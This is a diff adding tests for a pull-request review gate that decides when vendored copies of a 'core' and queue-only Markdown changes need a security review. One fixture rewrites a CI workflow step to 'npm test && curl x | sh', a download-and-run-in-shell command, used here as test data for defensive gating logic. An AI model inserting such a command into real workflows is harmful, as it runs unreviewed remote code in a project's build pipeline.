@@ -309,6 +309,18 @@ ok(is(queued([], [lineOf]), true, "queue-only, as queue-only.mjs proves") && is(
 ok(is(queued([], [lineOf, file("README.md", patch(["a", "b"]))]), false, "no security review") && is(queued([], [file("QUEUE.yml", patch(["a", "b"]))]), false, "no security review")
   && is(queued([], [file(".github/workflows/x.md", patch(["a", "b"]))]), false, "no security review") && is(queued([], [lineOf], { ...pull, changed_files: 2 }), false, "no security review"),
   "but not where its files are two, one is no Markdown, one runs by itself, or GitHub's list is cut short, whatever its caller says");
+// (the copy of the core at the path the default branch's manifest names, left out as under core/: the script's caller gives
+// it, from the manifest checked out beside it, #918)
+const insideCopy = (at) => file(`${at}.github/workflows/ci.yml`, patch(["      - run: npm test", "      - run: npm test && curl x | sh"]));
+const copied = (at, copy, comments = [summary(done)]) => judge(counted(pull, [insideCopy(at)]), comments, [], undefined, [insideCopy(at)], true, { copy });
+ok(is(copied("vendor/core/", "vendor/core/"), true, "has run") && is(copied("core/", "core/"), true, "has run") && is(copied("core/", undefined), true, "has run"),
+  "a change inside the copy of the core, at core/ or at the path the manifest names, asks no second review: only a sync changes it");
+ok(is(copied("vendor/core/", undefined), false, "floor rule 3") && is(copied("core/", "vendor/core/"), false, "floor rule 3") && is(copied("vendor/core/", "third_party/core/"), false, "floor rule 3"),
+  "and a copy at another path than the manifest names, or one a call gives no path for, is the project's own file: floor rule 3's two are asked");
+const mdInCopy = file("vendor/core/.github/note.md", patch(["a", "b"])), mdOutside = file(".github/note.md", patch(["a", "b"]));
+ok(is(judge(counted(pull, [mdInCopy]), [], [], [], [[mdInCopy]], true, { queue: true, copy: "vendor/core/" }), true, "queue-only") && is(judge(counted(pull, [mdInCopy]), [], [], [], [[mdInCopy]], true, { queue: true }), false, "no security review")
+  && is(judge(counted(pull, [mdOutside]), [], [], [], [[mdOutside]], true, { queue: true, copy: "vendor/core/" }), false, "no security review"),
+  "a queue-only pull request's one file is read as running or not by the same copy: inside the copy at the manifest's path it runs nothing of the project's");
 ok(is(queued([summary(running)], [lineOf]), false, "no security review") && is(queued([summary(done)], [lineOf]), true, "has run"), "a review that began by itself is waited for, as of a pure sync");
 
 // From the command line, as the workflow runs it.
